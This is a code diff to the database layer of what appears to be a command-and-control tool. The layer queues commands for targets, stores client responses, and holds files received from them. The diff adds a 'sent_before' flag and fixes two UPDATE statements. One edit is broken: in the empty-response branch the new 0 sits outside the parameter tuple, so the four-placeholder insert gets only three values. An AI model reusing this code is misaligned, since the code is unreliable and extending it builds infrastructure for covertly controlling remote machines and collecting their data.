@@ -198,7 +198,7 @@ class DB:
             raise EzCncError(f"Exception occured while checking for commands [ {e} ]")
 
     def insert_file(self, file_data, uuid: str,command:str):
-        query = "INSERT INTO files (files_id, file_name,file, file_type,command) VALUES (? , ? , ? , ?,?)"
+        query = "INSERT INTO files (files_id, file_name,file, file_type,command,sent_before) VALUES (? , ? , ? , ?,?,?)"
         self.cr.execute(
             query,
             (
@@ -206,7 +206,8 @@ class DB:
                 file_data.filename,
                 file_data.file.read(),
                 os.path.splitext(file_data.filename)[1],
-                command
+                command,
+                0
             ),
         )
         Query3 = "DELETE FROM commands where command = ? and target = ?"
@@ -222,9 +223,9 @@ class DB:
     
     def change_sent_status(self,status:int,response_time,table:str):
         if table == "response":
-            Query = "UPDATE response SET sent_before ? where response_time = ?"
+            Query = "UPDATE response SET sent_before =  ? WHERE response_time = ?"
         else:
-            Query = "UPDATE files SET sent_before ? where received_date= ?"
+            Query = "UPDATE files SET sent_before = ? WHERE received_date= ?"
         
         self.cr.execute(Query,(status,response_time))        
         self.db.commit()
@@ -275,14 +276,14 @@ class DB:
         else:
             ic(res)
     def insert_response(self, resp: ClientResponse):
-        Query1 = "INSERT INTO response(id,command,response,result) VALUES(?,?,?,?)"
-        Query2 = "INSERT INTO response(id,command,result) VALUES(?,?,?)"
+        Query1 = "INSERT INTO response(id,command,response,result,sent_before) VALUES(?,?,?,?,?)"
+        Query2 = "INSERT INTO response(id,command,result,sent_before) VALUES(?,?,?,?)"
         Query3 = "DELETE FROM commands where command = ? and target = ?"
         try:
             if resp.response == "":
                 self.cr.execute(
                     Query2,
-                    (self.uuid_to_id(str(resp.uuid)), resp.command, int(resp.result)),
+                    (self.uuid_to_id(str(resp.uuid)), resp.command, int(resp.result)),0
                 )
             else:
                 self.cr.execute(
@@ -291,7 +292,7 @@ class DB:
                         self.uuid_to_id(str(resp.uuid)),
                         resp.command,
                         resp.response,
-                        int(resp.result),
+                        int(resp.result),0
                     ),
                 )
             
